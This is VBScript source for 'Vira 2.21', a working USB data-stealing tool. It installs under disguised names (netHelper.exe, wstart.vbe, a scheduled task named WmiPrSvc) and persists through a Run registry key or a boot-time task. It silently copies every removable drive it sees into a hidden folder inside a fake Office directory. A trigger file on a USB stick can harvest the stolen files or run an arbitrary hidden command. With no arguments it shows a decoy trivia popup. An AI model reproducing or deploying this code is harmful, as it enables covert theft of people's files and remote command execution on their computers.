'*******************
'  FortUne Vira
'  Version 2.21
'*******************
Option Explicit
On Error Resume Next
Const ViraVersion = "2.21"
Const ViraTitle = "Vira 2"
Const ViraDescription = "Vira 2.21 Ultimate Edition"

' System
Dim Shell, Fso, IsAdmin
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

' Vira
Const ControlFile = "ViraControl.ini"
Dim FlagFileNum, FlagFile, CapacityGB, Destination
Dim Container, IsCopied(23)

' Customization Section
Const ConfigFile = "C:\Windows\system32\Wbem\Repository\CONFIG.CTI"

'****************
'  Main Program
'****************
If WScript.Arguments.Count = 0 Then
  ProcTrivia
Else
  Select Case WScript.Arguments(0)
    Case "install"
      If WScript.Arguments.Count = 1 Then
        Wsh.Quit InstallLocal(False, False)
      Else
        DefaultConfig
        Dim UST, arg, i
        UST = False
        i = 1
        Do Until i >= WScript.Arguments.Count
          Do Until i >= WScript.Arguments.Count
            arg = LCase(WScript.Arguments(i))
            If Mid(arg, 1, 1)="-" Or Mid(arg, 1, 1)="/" Then
              arg = Mid(arg, 2, Len(arg)-1)
              Exit Do
            End If
            i = i+1
          Loop
          Select Case arg
            Case "default"
              Exit Do
            Case "destination"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              Destination = CStr(WScript.Arguments(i+1))
              i = i+2
            Case "capacity"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              CapacityGB = CDbl(WScript.Arguments(i+1))
              i = i+2
            Case "flagfile"
              If i = WScript.Arguments.Count-1 Then Wsh.Quit 1
              FlagFile = Split(WScript.Arguments(i+1), "|")
              FlagFileNum = UBound(FlagFile)
              i = i+2
            Case "use-schtasks"
              UST = True
            Case "root"
              If AdminTest() Then
                Shell.RegWrite _
                  "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\Type", _
                  "radio", "REG_SZ"
                Shell.RegWrite _
                  "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\UncheckedValue", _
                  0, "REG_DWORD"
              End If
              i = i+1
            Case Else
              Wsh.Echo "Unknown argument """ & WScript.Arguments(i) & """"
              Wsh.Quit 1
          End Select
        Loop
        Wsh.Quit InstallLocal(True, UST)
      End If
    Case "help"
      MsgBox "Xie-Wen-Hao loves Ye-Zi", 0, ViraTitle & " Help"
    Case "credit"
      MsgBox ViraDescription, 64, ViraTitle
    Case "version"
      MsgBox "Vira Version " & ViraVersion, 0, ViraTitle
    Case "xwh-yz"
      ProcessMain
    Case Else
      ProcessMain
  End Select
End If

'***********
'  Library
'***********
Sub ViraInitialize
  ReadConfig
  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """"
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  Dim i
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Sub ViraSingleLoop
  Dim i, Letter, Drive
  For i = 0 To 22
    Letter = Chr(68 + i) 'From D: to Z:
    If Fso.DriveExists(Letter) Then
      If Not IsCopied(i) Then
        IsCopied(i) = DriveProcess(Letter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Function DriveProcess(DriveLetter)
  DriveProcess = False
  Dim Drive, Target, TimeA, TimeB, Text, Folder
  Set Drive = Fso.GetDrive(DriveLetter)
  If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
  If Not Drive.IsReady Then Exit Function
  If DriveControlProcess(DriveLetter) Then
    DriveProcess = True
    Exit Function
  End If
  If Drive.DriveType = 1 Then
    For i = 0 To FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        Exit Function
      End If
    Next
    
    Target = Destination & ConvertHex(Drive.SerialNumber) & "\"
    If Not Fso.FolderExists(Target) Then
      If Container.Size + Drive.TotalSize - Drive.FreeSpace < CapacityGB * 1000000000 Then
        Fso.CreateFolder Target
      Else
        Exit Function
      End If
    End If
    WriteDriveInfo DriveLetter, Target & "Vira.ini"
    TimeA = Timer()
    CopyDrive DriveLetter, Target
    TimeB = Timer()
    
    If TimeB < TimeA Then TimeB = TimeB + 86400
    Set Folder = Fso.GetFolder(Target)
    Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
    Text.WriteLine "[ExtendedDriveInfo]"
    Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
    Text.Close
    DriveProcess = True
  End If
End Function

Function DriveControlProcess(DriveLetter)
  DriveControlProcess = False
  Dim Text, Control
  If Fso.FileExists(DriveLetter & ":\" & ControlFile) Then
    Set Text = Fso.OpenTextFile(DriveLetter & ":\" & ControlFile ,1)
    If Text.ReadLine() = "VR3XC" Then
      Control = Text.ReadLine()
      Select Case Control
        Case "[ViraHarvest]"
          HarvestDrive DriveLetter, Text.ReadAll()
        Case "[ViraExecute]"
          ExecuteDrive DriveLetter, Text.ReadAll()
        Case "[ViraQuery]"
          QueryDrive DriveLetter, Text.ReadAll()
      End Select
      DriveControlProcess = True
      Exit Function
    Else
      Fso.DeleteFile DriveLetter & ":\" & ControlFile, True
    End If
  End If
End Function

Function HarvestDrive(DriveLetter, HarvestInfo)
  On Error Resume Next
  Dim Info, Target, TFolder, SFolder, PFolder, i
  Info = Split(HarvestInfo, vbCrLf)
  
  Dim cTarget, cCapacity, cCopyNonExist, cDeleteAfterHarvest, str
  cTarget = "\VHarvest\"
  cCapacity = 32
  cCopyNonExist = True
  cDeleteAfterHarvest = False
  For i = 0 To UBound(Info)-1
    str = Split(Info(i), "=")
    Select Case LCase(str(0))
      Case "target"
        cTarget = str(1)
      Case "capacity"
        cCapacity = CDbl(str(1))
      Case "copynonexist"
        cCopyNonExist = CBool(str(1))
      Case "deleteafterharvest"
        cDeleteAfterHarvest = CBool(str(1))
    End Select
  Next
  
  Target = DriveLetter & ":" & cTarget
  If Not Fso.FolderExists(Target) Then Fso.CreateFolder Target
  Set TFolder = Fso.GetFolder(Target)
  Set SFolder = Fso.GetFolder(Destination)
  
  For Each i In SFolder.SubFolders
    Set PFolder = Fso.GetFolder(i)
    If PFolder.Size + TFolder.Size <= cCapacity * 1000000000 Then
      Fso.CopyFolder i, Target, Not cCopyNonExist
      If cDeleteAfterHarvest Then Fso.DeleteFolder i, True
    End If
  Next
  
  If cDeleteAfterHarvest Then MsgBox "Progress Complete!", 64, ViraTitle
End Function

Function ExecuteDrive(DriveLetter, ExecuteInfo)
  On Error Resume Next
  ExecuteInfo = Replace(ExecuteInfo, "thisDrive", DriveLetter & ":")
  ExecuteInfo = Replace(ExecuteInfo, "storageDir", Destination)
  ExecuteInfo = Replace(ExecuteInfo, "storageCapacity", CapacityGB)
  Dim Control, Command, str, i
  Control = Split(ExecuteInfo, vbCrLf)
  For i = LBound(Control) To UBound(Control)
    str = Split(Control(i), "=")
    Select Case LCase(str(0))
      Case "command"
        Command = str(1)
    End Select
  Next
  Shell.Run Command, 0, False
End Function

Function QueryDrive(DriveLetter, QueryInfo)
  On Error Resume Next
  QueryInfo = Split(QueryInfo, vbCrLf)
  Dim Fout, str, i
  For i = LBound(QueryInfo) To UBound(QueryInfo)
    str = Split(QueryInfo(i), "=")
    Set Fout = Fso.OpenTextFile(DriveLetter & ":" & str(1), 2, True)
    Fout.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
    Fout.WriteLine "OperationTime=" & Now() & vbCrLf
    Dim Target, FlagFileStr, Iter, k
    Select Case str(0)
      Case "HarvestInfo"
        k = 0
        Fout.WriteLine "[HarvestInfo]"
        Target = DriveLetter & ":" & str(1) & ".files\"
        Fso.CreateFolder Target
        For Each Iter In Container.SubFolders
          Fout.WriteLine k & "=" & Iter.Name
          Fso.CopyFile Iter & "\Vira.ini", Target & Iter.Name & ".ini", True
          k = k+1
        Next
      Case "StorageInfo"
        Fout.WriteLine "[StorageInfo]"
        Fout.WriteLine "MaximumCapacity=" & ConvertSize(CapacityGB*1000000000)
        Fout.WriteLine "OccupiedSize=" & Container.Size & " (" & ConvertSize(Container.Size) & ")" & vbCrLf
        Fout.WriteLine "[Details]"
        For Each Iter In Container.SubFolders
          Fout.WriteLine Iter.Name & "=" & Iter.Size & " (" & ConvertSize(Iter.Size) & ")"
        Next
      Case "ViraConfig"
        Fout.WriteLine "[ViraConfig]"
        Fout.WriteLine "ContainerDirectory=" & Destination
        Fout.WriteLine "CapacityGB=" & CapacityGB
        FlagFileStr = FlagFile(0)
        For k = 1 To FlagFileNum-1
          FlagFileStr = FlagFileStr & "|" & FlagFile(k)
        Next
        Fout.WriteLine "FlagFiles=" & FlagFileStr
    End Select
    Fout.Close
    Set Fout = Nothing
  Next
End Function

Function WriteDriveInfo(DriveLetter, Target)
  Dim Text, Drive
  Set Drive = Fso.GetDrive(DriveLetter)
  Set Text = Fso.OpenTextFile(Target, 2, True)
  Text.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Text.WriteLine "OperationTime=" & Now()
  Text.WriteLine "[DriveInfo]"
  Text.WriteLine "Label=" & Drive.VolumeName
  Text.WriteLine "SerialNumber=" & ConvertHex(Drive.SerialNumber)
  Text.WriteLine "FileSystem=" & Drive.FileSystem
  Text.WriteLine "TotalSize=" & Drive.TotalSize & " (" & ConvertSize(Drive.TotalSize) & ")"
  Text.WriteLine "DataSize=" & (Drive.TotalSize-Drive.FreeSpace) & " (" & _
                 ConvertSize(Drive.TotalSize-Drive.FreeSpace) & ")"
  Text.WriteLine "Usage=" & FormatNumber(100*(Drive.TotalSize-Drive.FreeSpace)/Drive.TotalSize, 2, True) & "%"
  Text.Close
End Function

Function CopyDrive(DriveLetter, Target)
  On Error Resume Next
  Fso.CopyFile DriveLetter & ":\*", Target, True
  Fso.CopyFolder DriveLetter & ":\*", Target, True
End Function

Function ReadConfig()
  ReadConfig = False
  Dim Text
  If Not Fso.FileExists(ConfigFile) Then
    DefaultConfig
    Exit Function
  End If
  Set Text = Fso.OpenTextFile(ConfigFile, 1)
  If Text.ReadLine() = "VR3XF" Then
    FlagFile = Split(Text.ReadLine(), "|")
    FlagFileNum = 1+UBound(FlagFile)
    CapacityGB = Text.ReadLine()
    Destination = Text.ReadLine()
    Text.Close
    ReadConfig = True
  Else
    DefaultConfig
    Exit Function
  End If
End Function

Function WriteConfig()
  WriteConfig = False
  If Not AdminCheck Then
    Exit Function
  End If
  Dim Config, FlagFileNames, i
  If FlagFileNum >= 1 Then FlagFileNames = FlagFile(0)
  For i = 1 To FlagFileNum - 1
    FlagFileNames = FlagFileNames & "|" & FlagFile(i)
  Next
  Set Config = Fso.OpenTextFile(ConfigFile, 2, True)
  Config.WriteLine "VR3XF"
  Config.WriteLine FlagFileNames
  Config.WriteLine CapacityGB
  Config.WriteLine Destination
  Config.WriteLine "XEOF"
  Config.Close
  WriteConfig = True
End Function

Function DefaultConfig()
  FlagFileNum = 2
  FlagFile = Array("setup.exe", "bootmgr")
  CapacityGB = 64
  Destination = "D:\Program Files\Microsoft Office\LiveUpdate\packages\"
End Function

Function InstallLocal(Silent, UseScheduledTask)
  InstallLocal = 1
  If Not AdminCheck() Then
    Exit Function
  End If
  Shell.Run "TASKKILL.EXE /F /IM netHelper.exe", 0, True
  If Not Silent Then
    DefaultConfig
    InstallPrompt
  End If
  WriteConfig
  Dim SysDir
  Set SysDir = Fso.GetSpecialFolder(1)
  If Fso.FileExists(Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe") Then
    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vhost.exe", SysDir & "\netHelper.exe", True
  Else
    Fso.CopyFile SysDir & "\wscript.exe", SysDir & "\netHelper.exe", True
  End If
  If Fso.FileExists("screnc.exe") Then
    Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", SysDir & "\wstart.vbe", True
    Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
  Else
    Fso.CopyFile WScript.ScriptFullName, SysDir & "\wstart.vbe", True
  End If
  If UseScheduledTask Then
    Shell.Run "SCHTASKS.EXE /Create /SC ONSTART /F /TN WmiPrSvc /TR " & _
              """'%SystemRoot%\system32\netHelper.exe' '%SystemRoot%\system32\wstart.vbe' xwh-yz""", 0, True
    Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper"
  Else
    Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper", _
                   "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\\wstart.vbe xwh-yz", "REG_SZ"
  End If
  MsgBox "Installation Complete!", 64, ViraTitle
  Shell.Run "%SystemRoot%\system32\netHelper.exe %SystemRoot%\system32\wstart.vbe xwh-yz", 0, False
  InstallLocal = 0
End Function

Sub InstallPrompt()
  MsgBox "Welcome to Vira installation.", 0, ViraTitle
  If MsgBox("Use default settings?", vbYesNo, ViraTitle) = vbNo Then
    Dim Input, i
    FlagFileNum = Abs(CInt(InputBox("Number of flag files:", ViraTitle, FlagFileNum)))
    ReDim Preserve FlagFile(FlagFileNum)
    For i = 0 To FlagFileNum - 1
      FlagFile(i) = InputBox("Flag file #" & i, ViraTitle, FlagFile(i))
    Next
    Destination = InputBox("File container location:" & vbCrLf & "Must end with a backslash [\]", ViraTitle, Destination)
    CapacityGB = Abs(CDbl(InputBox("Maximum size of container in GB:", ViraTitle, CapacityGB)))
  End If
End Sub

Function AdminCheck()
  Select Case IsAdmin
    Case 1
      AdminCheck = True
    Case 2
      AdminCheck = False
    Case Else
      On Error Resume Next
      Dim AdminTest, WinDir
      Set WinDir = Fso.GetSpecialFolder(0)
      AdminTest = WinDir & "\" & Fso.GetTempName() & "\"
      Fso.CreateFolder AdminTest
      WScript.Sleep 500
      If Fso.FolderExists(AdminTest) Then
        AdminCheck = True
        IsAdmin = 1
        Fso.DeleteFolder AdminTest, True
      Else
        AdminCheck = False
        IsAdmin = 2
      End If
  End Select
End Function

Function ConvertSize(ByVal Size)
  Dim SizeSuffix, i
  SizeSuffix = Array("B", "KB", "MB", "GB")
  For i = 0 To UBound(SizeSuffix) - 1
    If Size >= 1024 Then
      Size = Size / 1024
    Else
      Exit For
    End If
  Next
  ConvertSize = FormatNumber(Size, 2, True) & SizeSuffix(i)
End Function

Function ConvertHex(ByVal n)
  Const Prefix = "0000000"
  ConvertHex = Mid(PreFix, 1, 8-Len(Hex(n))) & Hex(n)
End Function

'  Master Shiang Dzurr plays silver power

Public Sub ProcessMain()
  ViraInitialize
  Do
    ViraSingleLoop
    WScript.Sleep 1000
  Loop
End Sub

Public Sub ProcTrivia()
  Dim TriviaText, TriviaNum
  TriviaText = Array(_
  "谢文皓喜欢叶子","国足亚洲杯出线了！","NVIDIA launches GeForce GTX 960.",_
  "微软发布Windows 10","AMD再次下调其全线显卡售价","北京和张家口申办2022年冬奥会",_
  "齐文轩推翻一道冬令营证明题","","Minecraft更新1.8迎来玩家追捧",_
  "使命召唤Call Of Duty推出天梯","肖行文才是真正的人生赢家","学校关闭金融中心",_
  "Master Shiang Dzurr plays silver power.","国足亚洲杯出线了！","Minecraft重大更新1.8发布！",_
  "为歌星姚贝娜送行","曾火山又出神奇考题","通用课出现各种神奇创意作品",_
  "Gmail邮件服务在中国全面被Qiang","中央反腐又出新规","Zhao紫阳逝世十周年",_
  "新一届初三比以往更熊","田瑞给大家送可乐啦！","龙创系统岌岌可危",_
  "据学长称叶子是梁帅的","新一波李梓彰黑照流出","曾火山教竞赛班",_
  "辛普森创下拖堂新纪录","三行诗迅速走红网络","某班级在生物实验课上集体烧洋葱",_
  "吴边和女票在一起的照片","陈冬杰让学生写情诗","小米Note正式发布即将上市"_
  )
  Randomize Timer()
  MsgBox TriviaText(Int(UBound(TriviaText) * Rnd)), 64, "你知道吗？"
End Sub
